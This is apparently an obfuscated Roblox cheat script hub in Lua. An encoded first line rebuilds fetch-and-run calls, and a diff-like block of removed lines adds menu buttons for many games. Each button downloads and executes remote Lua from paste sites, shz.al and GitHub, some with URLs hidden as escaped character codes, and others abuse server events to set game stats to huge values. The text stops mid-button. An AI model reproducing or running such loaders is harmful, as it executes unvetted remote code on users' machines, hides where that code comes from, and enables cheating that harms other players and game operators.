FEtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LnSIfNyaaWCLTpmWgZJcQODhehmSLfdHcbOEbvZBWiqsAvUJjZvafYHIBkzBTHAQBlEODxLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KKHHAJKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WTtYdPEgzviZoWgJogykSpdokooJFOcfJsSaoRCgbgbIwncWjhgiUarBWgFRlmdECzDjdRKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BackuptZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WUWoWbxSOXKxtVIqNptQyzNWYBRJpkxLtwEMwpVNHfpGcYdKeMcalMAoZirFvwrVbCeodLLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KKHHAJKKKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZhuRVQhaAkkmiuqrElmHnsPRkfHAUnESwnzlpgzKmGTHQUzlstjEKUMXUfqlgLlZadIrOgKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')AureatetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mneCCRYjhMnarwXamnOeoMKnwLJgVfPMYmrXYYfLPYujBUprUzxUwiTjdBPJKgwLlZxhgXLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KKHHAJKKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LmsOzGdXtXPMpkTPCwtoWXQySjbhpJyAmlykdchAxMjaLIstoieDhocPtePBOPoxlojIFrKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Anti Furry loltZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RFrwQKNTnLmdmWfRBWpSiCXFaCSBWJynDNGaTqpQsfWLhDHCLpCZCOvBFxiBJMgccDPbyKLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KMHtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CmJpiEAzpcWUGkdwdQHCFokhKjjcvJLIRQkpkoSxyLvyJhNcqIlJKpORdlgzsGfaHEbDjlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Bumper CartZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IlMsohUlUeMDlxeahiGFmJxOdXVkmZqpLwHhPgowAZUEvaSwVKUrAaYrUffAjWeIkCtLgWLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KMHKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PFDqsbtCYIjjvaUtvnwXsThJjHhhINRZjFrFdNqHnciMXTQTyPZNSrzZITyPyqSKmnuFmlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BizzarotZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HnjScQVLqaMfiLIdOBWTqWBsEYBlIsPkWtrxXQOMdkjgGZmrPFdkzNzDFOjKquCVxSLYbPLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KMHKMtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uhEPUGtRDijRAcqiqPljcKaznqFalnnqVutZsJZkNdNCKNPcsKmOFxfTIxYDkeKbMfDNmsKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')BillietZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tjtuGmQkKlBONGypyPjHSUOlvaRZeGuPCPBffLtyhYLfnrZZODmgDziZBAgOovZRNdNgaJLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KMHKMMtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cOMnOIDGemxWnezDjtAOaAvwgoeKjlvTvtHhwzDNbgVFgrBzcpQGBIbGPWvBiqaoPkAxjcKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Big DaddytZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('zZAbuGrmwQTCGnpigygChohyaCVFKhIpbbLtYYrjKULrLmzfYVYSSbysfnCZmPrQrtKifnLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~LBNtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lDBSygKMUzSWytCgyPgCGmWpLKcWZJXHSznssDMDkTGoFRUxsHCjAVHlDHZVjIalnrTlLwKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Ban SwordtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NdTknXfapeplLTpPOTHMJimiDQWDdEuDWlwwOFMTUcQlUPuqkdJfdiEpgUKaCJpcMPvCZcLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~LBNKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mJFSBvOhQRMgWMdcOlaOddaSvPBRkbpBwwprUfFPQTzZxPtiPhjIGdWAehVQDBrodEWqMcKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')cadacustZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yESyfUjcSYOznyywLsKJPnocEPvAsrWkzFsMIKdijiDUErrtZmGJfFgqOIEQdHJiTLeLVJLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~LBNKjtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dwBSXjoxiyshVpjIrUTyKgDpgqWzkoFGoldMolBuyvureffLzSNCSsLfefMHnnJNJWPQcPKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')CoptZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NgpFViMQwwXZhMOytWvafWOqMfXyyyMFbyCkSBGRTPCoNuvpIKiaTpITlvgZmDRiZPTcjbLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~LBNKjktZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PxTpMPAKbNNLJaohhAqSrgfBJZOdHSwWKGAeqhwHCgAYotPQucIWbtMYOOAGHYAQvZiTPdKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')CLOVRtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YVUIYJgumdOLweqjFDUQTQtcnbQXMGNsMRkjlRHKRgEOTKbosCzoIpKFyRkKihBAHGkqnBLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~kansjstZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mQBNiCdhzwNsbvPGuKqaGlobwFFroDiPMTsxailQpQtvllgRRWxjhZtPSkoUIKBOMqEBqWKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')ChipstZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WDkdEedvACrKfDWtRSIzixRtNmKtyuTVFcmlCfygKKUtmcLMiPyJbxSCxErIYqRCrnZzKQLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~kkkansjstZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HHFumsBVJFkhloFnicSPTEHqlFshtaGPeZYtwobVyBeXobvtdiTMJelgTUamCWDrkGxvjuKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')CharatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NJsWpmzLgzFjhFbjBsYOHfcVJkHdLvuqzsbdZRlsFhrvEffVhVfPCDKkZIroMKQrSWJVNwLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~97373tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RrMHAyODRHuIZfbrBDOxnTHgDCbXKBjjHnTnBaFCnuPbXJSovMwrSudqXXoVFNkzVkaXfuKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')CarnagetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jOweCooveRyzMrtYywyPFTDFoJFXRtWdemeKjETxWcKuGqTWuUhgYdfAqCZyIAQmdfUgRlLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~k97373tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uuQvTppXVGgDBgFzXdOopwEWflzZkuugDHwZsBwoVjillfWTxpawAGWTxjmMgGhcqgMOUmKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Pendulum Hub V5tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nPlbCTihgYmHRYyWQEsTQZmLLJAIXppkMiPGDLXmsONxVYPaubLQVDtSsLpDluEMaRdrDQLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~k97373ktZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vMCVTHkjNlhXiRoykxZHFQolpDvCanGkRfEOPcqtiJDKMRBrJihMIATbyloCgdzEJCNjwLKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')PUBG PantZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('niOSEomABWzGvPTjpTMYKjSigLlRMhxFyzFhPKVHwFOIhGBJeVDIqMiqbJoNFHDWkMUKRsLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~k97373kKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ebEfssbGyUJQFxPWcOxXxBYYreAQfecYGmWiGYItWXWPjjytcQswavBmxultFksglNnSlZKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')SCP-106tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('yPmWmRdIklQpFSoOEzPPmEKHsUFYgSEmIKQmAhQSvLucqkYxIejkrZksRyzhBzuVKUOGfHLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~LDStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bNztSbaSmmOebpWuiCBqUYJruZmMWMzRhZjCNswwKxxIIOraPPklCFlXnSdeehoFoBdiKtKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')KillbotV2tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OEkpBtmYkmrocXsZBAfPecRnaVgdQYkQViJuHjfdpUobfvsBhqqNBQQsstJZxHbuGtNSgNLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~LDSLStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dyFRuyUpQleNMCDpRzodByUsVIojwiYxfKveJXpvsvOMQELSldAmZRmsKaJPuhIgJfWbTwKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')Vehicle Legends CARS!脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OwQIPByTbCalxrWYLECkfdhgbtUvZMUtpvihNoAKpmxZVxqfcHkIeatqdGWxAlXvIHDucPLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lTCGLVvTDopaoaTkwBrjzrPLyYsoPxEOeRxwoQAuPJsJsOMkmUnPLsryBJlHTmLhjcEUMXKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『卡密模式』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HtIxqMotXtCRImgcoLOVXzYfAMTSPIApsTxQcwBcOZYiNqxGvRGlBTTYTpvCQSQKGhWRPCLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')Vehicle Legends CARS!tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('lvOXjbxspDExDDSBDRVSWgemPYVRAMaIkWkCnnHnLXtYFAbikQlGARQYEGnMvMefkpJeWTLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://scripts.luawl.com/hosted/2399/18728/FiberHubFree.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZRgIMTbwNuWliwDfwjcbVhAFPHRqJUyFPWUNXXlJPSPNFnhRyZaoPrRNwRlzgSeGQprCuqKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')点击我复制dc链接自己弄tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GpjmPbEQxGmmKZUjoGsVZZcyumRYFMfsNWZaCLpIJHArPAXdtidFIxgBXhsWcvgaXsYjZnLGZ1bmN0aW9uKCkNCiAgICBzZXRjbGlwYm9hcmQo')https://discord.gg/NZYMVZvT2HtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xfshdHqSEoNNbwdWEQGqZoevwwBnpGseaLVFtLykouJqKAAjcMClAErajjEhUaEGRIpAesKQ0KZW5kKQ0KbG9jYWwgY3JlZGl0cyA9IGNyZWRzOnNlY3Rpb24o')『不需要卡密模式』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rITNeOqxyAGIwUPnSOuwXMhmgiAfIiPSMqbXqgnTZICCLWYuedRawuNmBGDtcQuvSSEtAuLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')Vehicle Legends CARS!tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DWVJgsTnyhrCvKnoiomjnkfnCwDUhfhhFcRTryIZEZGqmlAtDQKFeHWFAlmMwZdCxCmIdfLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/houjk2/Boosthub/main/main.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TQuRnMxWvrRZtzKbHKrxjOQYyWCtmoxNUtVyMHVHFpQEfEoHPYkftcSrPoGrauOiMQkYetKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')Vehicle Legends CARS!tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CnxAScfqDUfXSvDpLHYvAYPdBQUtYpsfZLbKCchQLpUjQEwQytQwNsQaymqQCiQJhZVTEPLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~CNCJJFD882tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qDljvnYqcmiKetufPqrSQKghDdbcZINznMOCDCXUsiilRlMsDabRnsoNxQKtHMnMxCWwXiKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')SoltZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GNEDPSuVoZCtVlpOOTzMiPzFSYlCpTCqamyXFTSNdGYgvfKXuOVlIosiOTvoJZVBEdNFGVcyBSTkfohJrmnKw='),tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OkxciRJEihJscOHUJFIUsguqazzdBrSKlGzijxuBDZmxgmEqJTlkWKAQJbbyKuheyjsYnVMTYwNjAzMzM0NDg='))
 
-local creds = window:Tab("小偷模拟器脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("小偷模拟器",function()
-    loadstring(game:HttpGet(("https://raw.githubusercontent.com/adrician/Thief-Simulator---GUI/main/Thief%20sim.lua"),true))()
-end)
-
-local creds = window:Tab("evade大逃脱",'16060333448')
-
-local credits = creds:section("evade脚本",true)
-    credits:Button("evade脚本1",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/PepesGH1/stuff/main/evadeloader.lua"))()
-end)
-    credits:Button("evade大逃脱",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/%E4%BA%91%E8%84%9A%E6%9C%ACEvade.lua"))()
-end)
-    credits:Button("老外脚本",function()
-    loadstring(game:HttpGet("https://shz.al/~jdjsjsKK"))()
-end)
-
-local creds = window:Tab("Fling Things and People脚本",'16060333448')
-
-local credits = creds:section("Fling Things and People脚本",true)
-    credits:Button("Fling Things and People1",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua"))()
-end)
-
-local creds = window:Tab("国王遗产脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("『1』",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/sannin9000/scripts/main/kinglegacy.lua"))()
-end)
-    credits:Button("『2』",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/master/legacy"))()
-end)
-    credits:Button("『3』",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/King%20Leagacy"))()
-end)
-    credits:Button("『4』",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Strikehubv2z/StormSKz/main/All_in_one"))()
-end)
-
-local creds = window:Tab("披萨店脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("披萨点自动工作",function()
-    loadstring(game:HttpGet("https://shz.al/~HHHSUSU"))()
-end)
-
-local creds = window:Tab("Drive World",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("Drive World脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/x3fall3nangel/FallAngelHub/main/DriveWorld.lua"))()
-end)
-
-local creds = window:Tab("一路向西",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("一路向西（无后坐力超级射速无限子弹）",function()
-    loadstring(game:GetObjects("rbxassetid://10040701935")[1].Source)()
-end)
-    credits:Button("一路向西（名字相同脚本不同）",function()
-    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Drifter0507/scripts/main/westbound"),true))()
-end)
-    credits:Button("一路向西（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/q08owYGG/raw"))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab(".,.77寻宝",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("造船寻宝（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("http://dirtgui.xyz/BuildABoat.lua",true))()
-end)
-    credits:Button("造船寻宝（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/hvV1c4nO/raw"))()
-end)
-    credits:Button("造船寻宝（复制别人船）",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/autobuild.txt"))()
-end)
-    credits:Button("造船寻宝（刷钱）",function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/urmomjklol69/GoldFarmBabft/main/GoldFarm.lua'),true))()
-end)
-
-local creds = window:Tab("鲨口求生脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("鲨口求生有一些功能慎用",function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/YYVLbzVg", true))()
-end)
-
-local creds = window:Tab("DOORS",'16060333448')
-
-local credits = creds:section("『LINNI Script』（最强只是听说）",true)
-    credits:Button("霖溺自制Doors",function()
-    loadstring(game:HttpGet("https://shz.al/yWFF"))()
-end)
-    credits:Button("新doors脚本",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/KINGHUB01/BlackKing-obf/main/Doors%20Blackking%20And%20BobHub"))()
-end)
-    credits:Button("最强汉化DOORS",function()
-    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
-end)
-    credits:Button("DX汉化加二改",function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/DXuwu/replicator-lol/main/dor.lua"))()
-end)
-    credits:Button("多功能DOORS",function()
-    loadstring(game:HttpGet("https://shz.al/~SJZJJSISI"))()
-end)
-    credits:Button("微山DOORS",function()
-    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\119\101\105\115\104\97\110\116\101\97\109\47\83\99\114\105\112\116\47\109\97\105\110\47\100\111\111\114\115\47\87\101\105\83\104\97\110\95\76\111\97\100\101\114\46\108\117\97\10"))()
-end)
-    credits:Button("Doors（名字相同脚本不同）",function()
-    loadstring(game:HttpGet("https://pastefy.app/Su9RsViT/raw"))()
-end)
-    credits:Button("Doors（最强1）",function()
-    loadstring(game:HttpGet(("https://raw.githubusercontent.com/mstudio45/poopdoors_edited/main/poopdoors_edited.lua"),true))()
-end)
-    credits:Button("Doors（最强2）",function()
-    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
-end)
-    credits:Button("Doors（最强3）",function()
-    loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()
-end)
-    credits:Button("DOORS听说是好用脚本",function()
-    loadstring("\112\114\105\110\116\40\34\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\73\78\71\72\85\66\48\49\47\66\108\97\99\107\75\105\110\103\47\109\97\105\110\47\66\108\97\99\107\75\105\110\103\37\50\48\68\111\111\114\115\37\50\48\77\111\98\105\108\101\34\41\41\40\41\32\34\41\10")()
-end)
-    credits:Button("Doors（过room）",function()
-    loadstring(game:HttpGet('\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x2E\x6C\x6B\x6D\x63\x2E\x61\x73\x69\x61\x2F\x73\x63\x72\x69\x70\x74\x2F\x64\x6F\x6F\x72\x73\x72\x6F\x6F\x6D\x2E\x6C\x75\x61'))()
-end)
-    credits:Button("剑客脚本",function()
-    jianke_V4 = "作者_初夏"jianke__V4 = "作者QQ1412152634"jianke___V4 = "剑客QQ群347724155"loadstring(game:HttpGet(('https://shz.al/~JianKeV4')))()
-end)
-
-local creds = window:Tab("破坏模拟器脚本",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("破坏模拟器",function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AquaModz/DestructionSIMModded/main/DestructionSimAqua.lua'))()
-end)
-
-local creds = window:Tab("驾驶帝国",'16060333448')
-
-local credits = creds:section("驾驶帝国脚本",true)
-    credits:Button("驾驶帝国（英文）",function()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/zeuise0002/SSSWWW222/main/README.md'),true))()
-end)
-    credits:Button("驾驶帝国（英文）",function()
-    loadstring(game:HttpGet("https://soggyhubv2.vercel.app"))()
-end)
-
-local creds = window:Tab("动物进化脚本『有稳定』",'16060333448')
-
-local credits = creds:section("『LINNI Script』",true)
-    credits:Button("动物进化1『容易封』",function()
-    game:GetService("ReplicatedStorage").Events.UpdateStatEvent:FireServer("Lv", 999999999)
-end)
-    credits:Button("动物进化2『容易封』",function()
-    game:GetService("ReplicatedStorage").Events.UpdateStatEvent:FireServer("Xp", 999999999)
-end)
-    credits:Button("动物进化3『容易封』",function()
-    game:GetService("ReplicatedStorage").Events.UpdateStatEvent:FireServer("DmgLvl", 999999999)
-end)
-    credits:Button("动物进化4『容易封』",function()
-    game:GetService("ReplicatedStorage").Events.UpdateStatEvent:FireServer("CritDmgLvl", 999999999)
-end)
-    credits:Button("动物进化『容易封』",function()
-    local player = game.Players.LocalPlayer
-
-for _, child in ipairs(player:GetChildren()) do
-    if child:IsA("BoolValue") then
-        child.Value = true
-    end
-end
-end)
-    credits:Button("动物进化『稳』",function()
